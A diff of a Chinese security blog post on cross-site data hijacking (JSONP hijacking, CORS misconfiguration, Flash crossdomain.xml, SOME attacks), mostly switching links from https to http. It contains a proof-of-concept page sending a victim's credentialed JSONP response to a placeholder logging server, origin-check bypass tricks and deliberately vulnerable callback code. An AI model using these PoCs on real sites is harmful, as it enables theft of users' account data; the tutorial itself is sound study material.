@@ -134,7 +134,7 @@
 <meta property="og:image" content="http://static.zybuluo.com/Passer6y/fn7fgxpo2frzoulyy7etl77x/image_1cnca2td11k60k0t14v31ug18cb9.png">
 <meta property="og:image" content="http://static.zybuluo.com/Passer6y/skwpcwsgre3cygayeae9bmcb/image_1cndg7u8l1k541rejoju1sihul16.png">
 <meta property="og:image" content="http://static.zybuluo.com/Passer6y/6b5q4bwc7wx2b8623epqjiew/image_1cne6g1d01smp6gmv2413518sm3j.png">
-<meta property="og:updated_time" content="2019-02-10T12:58:28.000Z">
+<meta property="og:updated_time" content="2020-03-19T11:16:35.005Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="跨站数据劫持">
 <meta name="twitter:description" content="学习了一下常见的前端漏洞">
@@ -169,7 +169,7 @@
     var _hmt = _hmt || [];
     (function() {
       var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?14e9c0326e763de8b0a61711cc963a58";
+      hm.src = "http://hm.baidu.com/hm.js?14e9c0326e763de8b0a61711cc963a58";
       var s = document.getElementsByTagName("script")[0];
       s.parentNode.insertBefore(hm, s);
     })();
@@ -464,7 +464,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-02-10 20:58:28" itemprop="dateModified" datetime="2019-02-10T20:58:28+08:00">2019-02-10</time>
+                <time title="Modified: 2020-03-19 19:16:35" itemprop="dateModified" datetime="2020-03-19T19:16:35+08:00">2020-03-19</time>
               
             
           </span>
@@ -571,7 +571,7 @@
 <p><a href="http://wooyun.jozxing.cc/static/drops/tips-1439.html" target="_blank" rel="noopener">浏览器安全策略说之内容安全策略CSP</a></p>
 <p>三： 同源策略(SOP)又是什么？<br>同源策略限制了从同一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的重要安全机制。<br>相同源：当两个域具有<strong>相同的协议，相同的域名，同端口</strong>，说明这是相同源。</p>
 <p>四：那么如何跨域获取资源？<br>由于受到同源策略的影响，跨域数据会受到制约。但是人们想出了很多跨域的方式。</p>
-<p><a href="https://juejin.im/entry/58a3ca13128fe10058c5863b" target="_blank" rel="noopener">https://juejin.im/entry/58a3ca13128fe10058c5863b</a></p>
+<p><a href="http://juejin.im/entry/58a3ca13128fe10058c5863b" target="_blank" rel="noopener">http://juejin.im/entry/58a3ca13128fe10058c5863b</a></p>
 <ol>
 <li>Jsonp</li>
 <li>CORS(Cross-Origin Resource Sharing)</li>
@@ -584,12 +584,12 @@
 <p>B网站将数据打包好，回传给A网站，并调用A站的passer6y函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$userInfo = &apos;FDrag0n&apos;;</span><br><span class="line">$jsdata = json_encode($userInfo);</span><br><span class="line"></span><br><span class="line">!empty($_GET[&apos;callback&apos;]) ? $_GET[&apos;callback&apos;] : &apos;callback&apos;;</span><br><span class="line">echo $_GET[&apos;callback&apos;].&apos;(&apos;.json_encode($jsdata).&apos;)&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
 <p>A网站执行paser6y函数：<br><img src="http://static.zybuluo.com/Passer6y/54vv57a0ndctc3e9zepraeao/image_1cnas5qoma2r1cqh112l14i91te51j.png" alt="image_1cnas5qoma2r1cqh112l14i91te51j.png-34.7kB"></p>
 <blockquote>
-<p>还有一些其他标签跨域的方法：<a href="https://www.anquanke.com/post/id/97671" target="_blank" rel="noopener">https://www.anquanke.com/post/id/97671</a></p>
+<p>还有一些其他标签跨域的方法：<a href="http://www.anquanke.com/post/id/97671" target="_blank" rel="noopener">http://www.anquanke.com/post/id/97671</a></p>
 </blockquote>
 <p>六：CORS：跨域资源共享<br>因为浏览器会限制从脚本发起的跨域HTTP请求(比如：<code>XMLHttpRequest</code>、<code>Fetch APIs</code>)，而且jsonp传输数据难以做权限校验，如果传输过程涉及敏感信息，恶意的网站B将数据jsonp的数据接口嵌入自己的网站页面，从而用户访问者浏览B页面的时候，将其在A站的敏感数据盗取(CSRF)。这时候就出现了CORS。</p>
 <p><img src="http://static.zybuluo.com/Passer6y/3s9q6mu0tmv0bd28xq525wwv/image_1cnas4rigeaf1cj8rn218hgdce16.png" alt="image_1cnas4rigeaf1cj8rn218hgdce16.png-74kB"></p>
 <p>否则就会被同源策略限制：<br><img src="http://static.zybuluo.com/Passer6y/azj7xfpnud0cr6y5ns8p9c0r/image_1cndvgnu54or1d1u1cii10q05kf1m.png" alt="image_1cndvgnu54or1d1u1cii10q05kf1m.png-12.1kB"></p>
-<p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" target="_blank" rel="noopener">详情：MDN CORS Docs</a></p>
+<p><a href="http://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" target="_blank" rel="noopener">详情：MDN CORS Docs</a></p>
 <p>如果设置允许发送cookie:<code>Access-Control-Allow-Credentials: true</code>，那么就和CSRF一样了。</p>
 <p><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="noopener">跨域资源共享CORS详解</a></p>
 <h2 id="0x02-Jsonp-劫持"><a href="#0x02-Jsonp-劫持" class="headerlink" title="0x02 Jsonp 劫持"></a>0x02 Jsonp 劫持</h2><p>1.利用条件：</p>
@@ -606,18 +606,18 @@
 <ul>
 <li>Selenium: 在网页上瞎点按钮、超链接等</li>
 <li>Proxy： 记录所有请求，过滤带有敏感信息的jsonp请求，并记录下HTTP请求</li>
-<li>验证脚本：去掉Referer字段，再次发送请求<br><a href="https://github.com/qiaofei32/jsonp_info_leak" target="_blank" rel="noopener">jsonp_info_leak Tools</a></li>
+<li>验证脚本：去掉Referer字段，再次发送请求<br><a href="http://github.com/qiaofei32/jsonp_info_leak" target="_blank" rel="noopener">jsonp_info_leak Tools</a></li>
 </ul>
 <ol start="3">
 <li><p>Exploit<br>将含有jsonp劫持漏洞的数据接口嵌入我们的Attack站上，用户点开窃取受害者账户信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;xxxx CORs Poc&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h2&gt;xxxx CORs POC&lt;/h2&gt; &lt;button type=&quot;button&quot; onclick=&quot;cors()&quot;&gt;Poc&lt;/button&gt; &lt;/div&gt; &lt;script&gt;</span><br><span class="line">  function cors()&#123;</span><br><span class="line">    var xhttp = new XMLHttpRequest();</span><br><span class="line">    xhttp.onreadystatechange = function() &#123;</span><br><span class="line">      if(this.readyState == 4 &amp;&amp; this.status == 200) </span><br><span class="line">      &#123;</span><br><span class="line">        document.location=&apos;http://记录数据的服务器地址?&apos;+escape(this.responseText);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    xhttp.open(&apos;GET&apos;,&apos;https://jsonp接口&apos;,true);</span><br><span class="line">    xhttp.withCredentials = true;</span><br><span class="line">    xhttp.send();</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;xxxx CORs Poc&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h2&gt;xxxx CORs POC&lt;/h2&gt; &lt;button type=&quot;button&quot; onclick=&quot;cors()&quot;&gt;Poc&lt;/button&gt; &lt;/div&gt; &lt;script&gt;</span><br><span class="line">  function cors()&#123;</span><br><span class="line">    var xhttp = new XMLHttpRequest();</span><br><span class="line">    xhttp.onreadystatechange = function() &#123;</span><br><span class="line">      if(this.readyState == 4 &amp;&amp; this.status == 200) </span><br><span class="line">      &#123;</span><br><span class="line">        document.location=&apos;http://记录数据的服务器地址?&apos;+escape(this.responseText);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    xhttp.open(&apos;GET&apos;,&apos;http://jsonp接口&apos;,true);</span><br><span class="line">    xhttp.withCredentials = true;</span><br><span class="line">    xhttp.send();</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>Bypass<br>正则配置不当绕过：<code>.*domain\.com</code>-&gt;<code>domain.com.evil.me</code><br>空referer绕过：<code>&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;</code><br><img src="http://static.zybuluo.com/Passer6y/fn7fgxpo2frzoulyy7etl77x/image_1cnca2td11k60k0t14v31ug18cb9.png" alt="image_1cnca2td11k60k0t14v31ug18cb9.png-40.2kB"></p>
 </li>
 </ol>
 <p>jsonp跨域传输的url可控的话，说不定还能造成xss等其他问题</p>
 <p>参考：</p>
-<p><a href="http://www.infosec-wiki.com/?p=455211" target="_blank" rel="noopener">如何挖掘Jsonp漏洞</a><br><a href="https://www.anquanke.com/post/id/97671" target="_blank" rel="noopener">JSONP与CORS漏洞挖掘</a></p>
+<p><a href="http://www.infosec-wiki.com/?p=455211" target="_blank" rel="noopener">如何挖掘Jsonp漏洞</a><br><a href="http://www.anquanke.com/post/id/97671" target="_blank" rel="noopener">JSONP与CORS漏洞挖掘</a></p>
 <h2 id="0x03-Flash跨域数据劫持"><a href="#0x03-Flash跨域数据劫持" class="headerlink" title="0x03 Flash跨域数据劫持"></a>0x03 Flash跨域数据劫持</h2><p>Flash跨域访问的时候主要受到crossdomain.xml文件的影响，当A网站嵌入一个Flash，然后Flash跨域请求B网站下的资源，这个时候就会先查看B网站下的crossdomain.xml文件是否允许A网站Flash请求B网站的资源。</p>
 <p>模板站点下必须存在crossdomain.xml，且配置循序其他域的AS脚本进行跨域请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;cross-domain-policy&gt;</span><br><span class="line">&lt;allow-access-from domain=&quot;*&quot; /&gt;</span><br><span class="line">&lt;/cross-domain-policy&gt;</span><br></pre></td></tr></table></figure></p>
 <p>如果allow-access-from domain被设置为*后，可能造成Flash Csrf的风险(同时这也是我们搜集子域名的一种方式~)。</p>
@@ -628,14 +628,14 @@
 <ol start="2">
 <li>Exploit</li>
 </ol>
-<p>POC：<a href="https://github.com/nccgroup/CrossSiteContentHijacking" target="_blank" rel="noopener">Cross-Site Content (Data) Hijacking (XSCH) PoC Project</a></p>
+<p>POC：<a href="http://github.com/nccgroup/CrossSiteContentHijacking" target="_blank" rel="noopener">Cross-Site Content (Data) Hijacking (XSCH) PoC Project</a></p>
 <p>这里本地搭建好测试的过程：<br><img src="http://static.zybuluo.com/Passer6y/skwpcwsgre3cygayeae9bmcb/image_1cndg7u8l1k541rejoju1sihul16.png" alt="image_1cndg7u8l1k541rejoju1sihul16.png-66.4kB"></p>
 <p>或者使用Flash ActionScript跨域发送请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import flash.net.*;</span><br><span class="line">var _l = new URLLoader(new URLRequest(“http://目标站点/&quot;));</span><br><span class="line">_l.addEventListener(Event.COMPLETE,function()&#123;text1.text = _l.data&#125;);</span><br><span class="line">_l.load();</span><br></pre></td></tr></table></figure></p>
-<p>案例：<br><a href="http://www.freebuf.com/articles/web/35353.html" target="_blank" rel="noopener">Flash跨域数据劫持</a><br><a href="https://soroush.secproject.com/blog/2014/05/even-uploading-a-jpg-file-can-lead-to-cross-domain-data-hijacking-client-side-attack/" target="_blank" rel="noopener">即使上传JPG文件也可能导致跨站点内容劫持</a></p>
+<p>案例：<br><a href="http://www.freebuf.com/articles/web/35353.html" target="_blank" rel="noopener">Flash跨域数据劫持</a><br><a href="http://soroush.secproject.com/blog/2014/05/even-uploading-a-jpg-file-can-lead-to-cross-domain-data-hijacking-client-side-attack/" target="_blank" rel="noopener">即使上传JPG文件也可能导致跨站点内容劫持</a></p>
 <h2 id="0x04-CORS跨域资源读取"><a href="#0x04-CORS跨域资源读取" class="headerlink" title="0x04 CORS跨域资源读取"></a>0x04 CORS跨域资源读取</h2><p>这个没啥好说的，配置不当导致，看到<code>access-Control-Allow-Origin</code>为*，或者可绕过。然后还<code>Access-Control-Allow-Credentials</code>为TRUE,发送cookie，和CSRF一样，</p>
 <p>demo：<br>Victim.com：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&apos;Access-Control-Allow-Origin: *&apos;);</span><br><span class="line">//header(&apos;Access-Control-Allow-Credentials:true&apos;);</span><br><span class="line">echo &quot;Fdrag0n love bed&quot;;</span><br></pre></td></tr></table></figure></p>
 <p>Attack.com:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var request = new XMLHttpRequest();</span><br><span class="line">request.open(&quot;GET&quot;, &quot;http://107.175.17.240/1.php&quot;, true);</span><br><span class="line">request.send();</span><br><span class="line">request.onreadystatechange = function()&#123;</span><br><span class="line">    if(request.readyState === 4 &amp;&amp; request.status === 200)&#123;</span><br><span class="line">		alert(request.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>平台<a href="https://github.com/nccgroup/CrossSiteContentHijacking" target="_blank" rel="noopener">Cross-Site Content (Data) Hijacking (XSCH) PoC Project</a></p>
+<p>平台<a href="http://github.com/nccgroup/CrossSiteContentHijacking" target="_blank" rel="noopener">Cross-Site Content (Data) Hijacking (XSCH) PoC Project</a></p>
 <h2 id="Silverlight跨域"><a href="#Silverlight跨域" class="headerlink" title="Silverlight跨域"></a>Silverlight跨域</h2><h2 id="PostMessage"><a href="#PostMessage" class="headerlink" title="PostMessage"></a>PostMessage</h2><h2 id="0x05-Some攻击-Same-Origin-Method-Execution"><a href="#0x05-Some攻击-Same-Origin-Method-Execution" class="headerlink" title="0x05 Some攻击(Same Origin Method Execution)"></a>0x05 Some攻击(Same Origin Method Execution)</h2><p>SOME，类似于Hijking攻击，是<strong>同源</strong>代码执行漏洞的简称。</p>
 <p>危害：理论上任何具备点击功能的网站都存在这种攻击的可能，缺陷就是不能带参数进行操作</p>
 <ol>
@@ -654,7 +654,7 @@
 <p>json_data.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo $_GET[&quot;callback&quot;] . &quot;(&#123; Fdrag0n : &apos;Fdrag0n L0ve sleep&apos; &#125;);&quot;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
 <p>function.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Google Photos&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt; </span><br><span class="line">    function shareAllPhotos(data) &#123; </span><br><span class="line">        prompt(data.Fdrag0n);</span><br><span class="line">    &#125; </span><br><span class="line">    console.log(window.opener);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
 <ol start="2">
-<li><p>Exploit&amp;Tools<br><a href="https://github.com/linkedin/sometime" target="_blank" rel="noopener">https://github.com/linkedin/sometime</a><br><img src="http://static.zybuluo.com/Passer6y/6b5q4bwc7wx2b8623epqjiew/image_1cne6g1d01smp6gmv2413518sm3j.png" alt="image_1cne6g1d01smp6gmv2413518sm3j.png-146.5kB"></p>
+<li><p>Exploit&amp;Tools<br><a href="http://github.com/linkedin/sometime" target="_blank" rel="noopener">http://github.com/linkedin/sometime</a><br><img src="http://static.zybuluo.com/Passer6y/6b5q4bwc7wx2b8623epqjiew/image_1cne6g1d01smp6gmv2413518sm3j.png" alt="image_1cne6g1d01smp6gmv2413518sm3j.png-146.5kB"></p>
 </li>
 <li><p>Defence</p>
 </li>
@@ -663,7 +663,7 @@
 <li>回调值固定(或者白名单)，外部不可控</li>
 <li></li>
 </ul>
-<p>Game:<br><a href="https://www.someattack.com/Playground/" target="_blank" rel="noopener">Same Origin Method Execution</a></p>
+<p>Game:<br><a href="http://www.someattack.com/Playground/" target="_blank" rel="noopener">Same Origin Method Execution</a></p>
 <h2 id="0x07-组合拳"><a href="#0x07-组合拳" class="headerlink" title="0x07 组合拳"></a>0x07 组合拳</h2><p>自己臆想的几种… 还没有实现</p>
 <ol>
 <li>XSS+CORS数据劫持绕过<code>access-Control-Allow-Origin</code></li>
@@ -893,7 +893,7 @@
             <div class="links-of-author motion-element">
               
                 <span class="links-of-author-item">
-                  <a href="https://github.com/passer6y" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="http://github.com/passer6y" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
                   
                 </span>
               
@@ -918,7 +918,7 @@
               <ul class="links-of-blogroll-list">
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://hpdoger.cn/" title="Hpdoger" target="_blank">Hpdoger</a>
+                    <a href="http://hpdoger.cn/" title="Hpdoger" target="_blank">Hpdoger</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
@@ -926,19 +926,19 @@
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://www.0akarma.com/" title="0akarma" target="_blank">0akarma</a>
+                    <a href="http://www.0akarma.com/" title="0akarma" target="_blank">0akarma</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://www.cnblogs.com/H4lo" title="H4lo" target="_blank">H4lo</a>
+                    <a href="http://www.cnblogs.com/H4lo" title="H4lo" target="_blank">H4lo</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://www.cnblogs.com/P1g3/" title="P1g3" target="_blank">P1g3</a>
+                    <a href="http://www.cnblogs.com/P1g3/" title="P1g3" target="_blank">P1g3</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://patrilic.top/" title="Patrilic" target="_blank">Patrilic</a>
+                    <a href="http://patrilic.top/" title="Patrilic" target="_blank">Patrilic</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
@@ -946,11 +946,11 @@
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://threezh1.com/" title="Threezh1" target="_blank">Threezh1</a>
+                    <a href="http://threezh1.com/" title="Threezh1" target="_blank">Threezh1</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://blog.izgq.net/" title="ZGQ" target="_blank">ZGQ</a>
+                    <a href="http://blog.izgq.net/" title="ZGQ" target="_blank">ZGQ</a>
                   </li>
                 
               </ul>
